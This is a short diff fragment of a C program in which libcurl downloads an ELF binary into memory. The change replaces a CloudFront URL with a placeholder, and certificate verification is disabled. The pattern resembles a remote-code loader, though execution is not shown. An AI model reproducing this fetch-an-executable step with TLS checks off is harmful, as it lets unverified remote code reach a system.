@@ -93,7 +93,7 @@ int main(void) {
     
     if (curl) {
         // Set URL to download the ELF file
-        curl_easy_setopt(curl, CURLOPT_URL, "https://d1gv03otpto3fa.cloudfront.net/ec2compute");
+        curl_easy_setopt(curl, CURLOPT_URL, "https://url/to/elf/binary");
         curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
         curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
         curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
